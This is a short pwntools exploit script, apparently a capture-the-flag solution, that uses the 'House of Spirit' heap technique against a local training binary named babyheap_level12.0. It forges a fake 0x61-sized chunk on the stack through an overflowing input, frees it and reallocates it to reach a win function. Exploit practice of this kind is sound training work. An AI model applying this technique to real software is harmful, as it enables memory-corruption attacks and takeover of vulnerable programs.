#House Of Spirit
from pwn import *

r = process("/challenge/babyheap_level12.0")
r.sendline(b"malloc")
r.sendline(b"0")
r.sendline(b"48")
r.sendline(b"stack_malloc_win")
r.sendline(b"stack_scanf")
r.sendline(b"A"*48+p64(0x0000000000000000)+p64(0x0000000000000061)+p64(0x0000000000000000))
r.sendline(b"stack_free")
r.sendline(b"stack_malloc_win")
r.interactive()
